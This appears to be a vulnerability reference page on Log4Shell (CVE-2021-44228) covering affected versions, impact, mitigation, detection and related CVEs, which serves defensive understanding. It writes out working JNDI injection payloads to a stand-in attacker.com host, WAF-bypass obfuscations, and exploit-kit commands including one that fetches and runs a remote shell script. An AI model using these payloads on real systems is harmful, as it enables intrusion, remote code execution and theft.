---
title: "Log4Shell - CVE-2021-44228"
description: "Critical RCE vulnerability in Apache Log4j 2. Allows remote code execution without authentication via JNDI injection. CVSS 10.0/10."
category: "vulnerabilities"
url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
tags: ["rce", "java", "log4j", "critical", "jndi", "ldap", "cve", "0day"]
---

# Log4Shell (CVE-2021-44228)

**Log4Shell** is a **critical** **Remote Code Execution (RCE)** vulnerability in the Apache Log4j 2 library, discovered in December 2021. It is considered one of the most severe vulnerabilities of the last decade.

## Technical Information

- **CVE ID**: CVE-2021-44228
- **CVSS Score**: **10.0/10** (Critical)
- **CWE**: CWE-502 (Deserialization of Untrusted Data)
- **Discovered**: December 9, 2021
- **Discoverer**: Chen Zhaojun (Alibaba Cloud Security)

## Affected Component

**Apache Log4j 2**
- Affected versions: `2.0-beta9` to `2.14.1`
- Widely used logging library in Java
- Present in thousands of enterprise applications

## Attack Vectors

### JNDI Injection
The vulnerability exploits the **JNDI lookup** feature in Log4j:

```java
// Vulnerable log processing user input
logger.info("User agent: {}", request.getHeader("User-Agent"));
```

### Basic Payload
```bash
${jndi:ldap://attacker.com/evil}
```

### Common Vectors

1. **HTTP Headers**
   ```http
   User-Agent: ${jndi:ldap://attacker.com/a}
   X-Forwarded-For: ${jndi:ldap://attacker.com/a}
   Referer: ${jndi:ldap://attacker.com/a}
   ```

2. **Request Parameters**
   ```
   ?username=${jndi:ldap://attacker.com/a}
   ```

3. **POST Data**
   ```json
   {
     "username": "${jndi:ldap://attacker.com/a}"
   }
   ```

4. **Minecraft Servers**
   ```
   Chat message: ${jndi:ldap://attacker.com/a}
   ```

## Bypass Techniques

### Basic Obfuscation
```bash
${jndi:ldap://attacker.com/a}
${${lower:j}ndi:ldap://attacker.com/a}
${${upper:j}ndi:ldap://attacker.com/a}
${${::-j}ndi:ldap://attacker.com/a}
```

### WAF Bypass
```bash
${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

## Impact

### Exploitation
1. **Attacker** sends malicious payload
2. **Log4j** processes log with JNDI lookup
3. **Application** makes request to attacker's LDAP server
4. **LDAP server** responds with malicious Java class
5. **Application** executes attacker's code

### Consequences
- ‚úÖ **RCE** - Remote code execution
- ‚úÖ **No authentication** required
- ‚úÖ **Sensitive information** - Data theft
- ‚úÖ **Malware installation**
- ‚úÖ **Lateral movement** in internal networks
- ‚úÖ **Ransomware**

## Affected Versions

| Log4j Version | Status |
|---------------|--------|
| 2.0-beta9 - 2.14.1 | ‚ùå **Vulnerable** |
| 2.15.0 | ‚ö†Ô∏è Bypass possible (CVE-2021-45046) |
| 2.16.0 | ‚ö†Ô∏è DoS possible (CVE-2021-45105) |
| 2.17.0 | ‚úÖ **Secure** (Java 8) |
| 2.17.1+ | ‚úÖ **Secure** (Java 7) |

## Mitigation

### 1. Update Log4j (Recommended)
```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>
```

### 2. Configure JVM Flag
```bash
-Dlog4j2.formatMsgNoLookups=true
```

### 3. Remove JndiLookup Class
```bash
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

### 4. Log4j Configuration
```properties
log4j2.formatMsgNoLookups=true
```

## Detection

### Search for Log4j in Systems
```bash
# Linux
find / -name "log4j-core-*.jar" 2>/dev/null

# Verify version
unzip -p log4j-core-*.jar META-INF/MANIFEST.MF | grep Implementation-Version
```

### Network Scanning
```bash
# Nmap NSE script
nmap -p80,443,8080 --script log4shell target.com

# Nuclei
nuclei -t log4j/ -u https://target.com
```

### Honeypot/Canary Token
```bash
# Use DNS canary
${jndi:ldap://your-unique-id.canarytokens.com/a}
```

## Exploitation Tools

### Scanner
```bash
# Log4j-scan
python3 log4j-scan.py -u https://target.com

# Nuclei templates
nuclei -t cves/2021/CVE-2021-44228.yaml -u https://target.com
```

### Exploitation Framework
```bash
# JNDI-Exploit-Kit
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "curl attacker.com/rev.sh|bash"

# Marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8000/#Exploit
```

## Affected Applications (Examples)

### Enterprise Software
- Apache Struts2
- Apache Solr
- Apache Druid
- Apache Flink
- Elasticsearch
- VMware vCenter
- Steam

### Cloud Products
- AWS
- Google Cloud
- Azure
- Cloudflare
- Twitter
- Apple iCloud

### Gaming
- Minecraft Java Edition
- Minecraft: Bedrock Edition (partial)

## Related CVEs

### CVE-2021-45046
- **CVSS**: 9.0
- **Description**: Bypass of fix in 2.15.0
- **Fix**: Log4j 2.16.0

### CVE-2021-45105
- **CVSS**: 7.5
- **Description**: DoS via infinite recursion
- **Fix**: Log4j 2.17.0

### CVE-2021-44832
- **CVSS**: 6.6
- **Description**: RCE via JDBC Appender
- **Fix**: Log4j 2.17.1

## Timeline

- **24/11/2021**: Discovery by Alibaba Cloud
- **09/12/2021**: Public disclosure
- **10/12/2021**: Massive exploitation on Internet
- **13/12/2021**: Log4j 2.15.0 release
- **14/12/2021**: CVE-2021-45046 (bypass)
- **18/12/2021**: Log4j 2.17.0 release
- **28/12/2021**: CVE-2021-44832 discovered

## Resources

### Official
- [Apache Log4j Security](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

### Tools
- [log4j-scan](https://github.com/fullhunt/log4j-scan)
- [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/tree/master/cves/2021)

### Writeups and Analysis
- [LunaSec Advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [Swiss Gov NCSC](https://www.ncsc.admin.ch/ncsc/en/home/cyberangriffe/aktuelle-cybervorfaelle/schwachstelle-log4j.html)
- [HackerOne Bug Bounty Reports](https://hackerone.com/reports?q=log4shell)

---

**‚ö†Ô∏è Global Impact**: It is estimated that **billions** of devices were affected by Log4Shell, making it one of the most impactful vulnerabilities in history.

**üîí Recommended Action**: If your organization uses Java, verify IMMEDIATELY if Log4j is present and update to the latest version.
